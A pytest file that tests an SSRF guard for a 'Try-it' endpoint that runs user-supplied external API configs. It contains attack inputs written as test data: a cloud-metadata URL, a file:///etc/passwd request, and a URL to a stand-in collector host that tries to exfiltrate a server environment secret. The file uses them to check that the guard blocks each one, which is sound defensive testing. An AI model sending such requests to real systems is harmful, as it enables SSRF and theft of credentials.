"""Tests for the Try-it endpoint and its SSRF guard (#229).

The endpoint runs a user-supplied external_api config with a live request, so
the security-critical pieces are the URL guard (blocks internal / metadata
targets), the timeout clamp, and that the endpoint reuses the real adapter.
"""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import httpx
import pytest
from fastapi.testclient import TestClient

from taskorbit.api.deps import get_current_user_id
from taskorbit.api.main import create_app
from taskorbit.api.routes.tools import _clamp_timeout, _strip_env_access
from taskorbit.tools.generic_api import (
    ERROR_NETWORK,
    ERROR_TEMPLATE_INVALID,
    ERROR_URL_BLOCKED,
    GenericApiTool,
    UrlBlockedError,
    assert_public_url,
    parse_config,
)


def _addrinfo(ip: str, port: int = 443):
    return [(2, 1, 6, "", (ip, port))]


# ---------------------------------------------------------------------------
# assert_public_url
# ---------------------------------------------------------------------------


def test_assert_public_url_allows_public_host() -> None:
    with patch(
        "taskorbit.tools.generic_api.socket.getaddrinfo", return_value=_addrinfo("93.184.216.34")
    ):
        assert_public_url("https://example.com/api")  # does not raise


@pytest.mark.parametrize(
    "ip",
    [
        "169.254.169.254",  # cloud metadata (link-local)
        "127.0.0.1",  # loopback
        "10.0.0.5",  # private
        "192.168.1.10",  # private
        "172.16.0.1",  # private
        "0.0.0.0",  # unspecified
        "100.64.0.1",  # CGNAT (RFC 6598), only caught by the is_global check
    ],
)
def test_assert_public_url_blocks_internal_addresses(ip: str) -> None:
    with patch("taskorbit.tools.generic_api.socket.getaddrinfo", return_value=_addrinfo(ip)):
        with pytest.raises(UrlBlockedError):
            assert_public_url(f"https://internal.example/{ip}")


def test_assert_public_url_blocks_non_http_scheme() -> None:
    with pytest.raises(UrlBlockedError):
        assert_public_url("file:///etc/passwd")


def test_assert_public_url_blocks_unresolvable_host() -> None:
    import socket as _socket

    with patch(
        "taskorbit.tools.generic_api.socket.getaddrinfo",
        side_effect=_socket.gaierror("nope"),
    ):
        with pytest.raises(UrlBlockedError):
            assert_public_url("https://does-not-resolve.invalid")


# ---------------------------------------------------------------------------
# execute() url_guard hook
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_execute_returns_url_blocked_when_guard_rejects() -> None:
    def _guard(_url: str) -> None:
        raise UrlBlockedError("blocked")

    result = await GenericApiTool().execute(
        {"request": {"method": "GET", "url": "https://internal.example"}},
        url_guard=_guard,
    )
    assert result.success is False
    assert result.data["error_code"] == ERROR_URL_BLOCKED


@pytest.mark.asyncio
async def test_execute_without_guard_is_unchanged() -> None:
    """Production dispatch passes no guard and must not resolve or block."""
    resp = MagicMock(spec=httpx.Response)
    resp.status_code = 200
    resp.headers = {}
    resp.json = MagicMock(return_value={"ok": True})
    client = MagicMock()
    client.request = AsyncMock(return_value=resp)
    client.__aenter__ = AsyncMock(return_value=client)
    client.__aexit__ = AsyncMock(return_value=None)

    with patch("taskorbit.tools.generic_api.httpx.AsyncClient", return_value=client):
        result = await GenericApiTool().execute(
            {"request": {"method": "GET", "url": "https://api.example.com/x"}}
        )
    assert result.success is True


# ---------------------------------------------------------------------------
# Malformed-URL handling (a pasted URL with a stray tab must not 500)
# ---------------------------------------------------------------------------


def test_parse_config_strips_url_whitespace() -> None:
    config = parse_config({"request": {"method": "GET", "url": "\thttps://api.example.com/x  "}})
    assert config.url == "https://api.example.com/x"


@pytest.mark.asyncio
async def test_execute_returns_envelope_for_invalid_url() -> None:
    """httpx.InvalidURL is not a RequestError; it must be caught and returned
    as a clean envelope rather than escaping as a 500. Mocking the client so
    the dedicated except branch is exercised (and no real network is hit)."""
    client = MagicMock()
    client.request = AsyncMock(side_effect=httpx.InvalidURL("bad url"))
    client.__aenter__ = AsyncMock(return_value=client)
    client.__aexit__ = AsyncMock(return_value=None)

    with patch("taskorbit.tools.generic_api.httpx.AsyncClient", return_value=client):
        result = await GenericApiTool().execute(
            {"request": {"method": "GET", "url": "https://api.example.com/x"}}
        )
    assert result.success is False
    assert result.data["error_code"] == ERROR_NETWORK


# ---------------------------------------------------------------------------
# _clamp_timeout
# ---------------------------------------------------------------------------


def test_clamp_timeout_caps_excessive_value() -> None:
    out = _clamp_timeout({"request": {"method": "GET", "url": "x", "timeout_seconds": 120}})
    assert out["request"]["timeout_seconds"] == 15.0


def test_clamp_timeout_leaves_small_value() -> None:
    out = _clamp_timeout({"request": {"timeout_seconds": 5}})
    assert out["request"]["timeout_seconds"] == 5


def test_clamp_timeout_ignores_absent_or_malformed() -> None:
    assert _clamp_timeout({"request": {"method": "GET"}}) == {"request": {"method": "GET"}}
    assert _clamp_timeout({"request": {"timeout_seconds": "abc"}}) == {
        "request": {"timeout_seconds": "abc"}
    }


# ---------------------------------------------------------------------------
# POST /v1/tools/try
# ---------------------------------------------------------------------------


@pytest.fixture
def client():
    app = create_app()
    app.dependency_overrides[get_current_user_id] = lambda: 1
    with TestClient(app) as c:
        yield c
    app.dependency_overrides.clear()


def test_try_endpoint_happy_path(client: TestClient) -> None:
    resp = MagicMock(spec=httpx.Response)
    resp.status_code = 200
    resp.headers = {}
    resp.json = MagicMock(return_value={"dateTime": "2026-07-12T05:15:00"})
    http_client = MagicMock()
    http_client.request = AsyncMock(return_value=resp)
    http_client.__aenter__ = AsyncMock(return_value=http_client)
    http_client.__aexit__ = AsyncMock(return_value=None)

    with (
        patch("taskorbit.tools.generic_api.httpx.AsyncClient", return_value=http_client),
        patch(
            "taskorbit.tools.generic_api.socket.getaddrinfo",
            return_value=_addrinfo("93.184.216.34"),
        ),
    ):
        r = client.post(
            "/v1/tools/try",
            json={
                "parameters": {
                    "request": {"method": "GET", "url": "https://timeapi.io/time"},
                },
                "args": {},
            },
        )

    assert r.status_code == 200
    body = r.json()
    assert body["success"] is True
    assert body["data"]["data"] == {"dateTime": "2026-07-12T05:15:00"}
    assert "elapsed_ms" in body


def test_strip_env_access_forces_empty_whitelist() -> None:
    out = _strip_env_access({"auth": {"allowed_env": ["SECRET"]}, "request": {"url": "x"}})
    assert out["auth"] == {"allowed_env": []}


def test_try_endpoint_blocks_env_exfiltration(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A Try-it config cannot whitelist and exfiltrate a server env var: the
    route strips auth.allowed_env, so {{env.X}} fails as TEMPLATE_INVALID and
    the secret never reaches the (attacker-controlled) outbound request."""
    monkeypatch.setenv("FAKE_PROD_SECRET", "sk-should-not-leak")
    r = client.post(
        "/v1/tools/try",
        json={
            "parameters": {
                "request": {
                    "method": "GET",
                    "url": "https://collector.example/?x={{env.FAKE_PROD_SECRET}}",
                },
                "auth": {"allowed_env": ["FAKE_PROD_SECRET"]},
            },
            "args": {},
        },
    )

    assert r.status_code == 200
    body = r.json()
    assert body["success"] is False
    assert body["data"]["error_code"] == ERROR_TEMPLATE_INVALID
    assert "sk-should-not-leak" not in r.text


def test_try_endpoint_blocks_internal_target(client: TestClient) -> None:
    with patch(
        "taskorbit.tools.generic_api.socket.getaddrinfo",
        return_value=_addrinfo("169.254.169.254", 80),
    ):
        r = client.post(
            "/v1/tools/try",
            json={
                "parameters": {
                    "request": {
                        "method": "GET",
                        "url": "http://169.254.169.254/latest/meta-data/",
                    }
                },
                "args": {},
            },
        )

    assert r.status_code == 200
    body = r.json()
    assert body["success"] is False
    assert body["data"]["error_code"] == ERROR_URL_BLOCKED
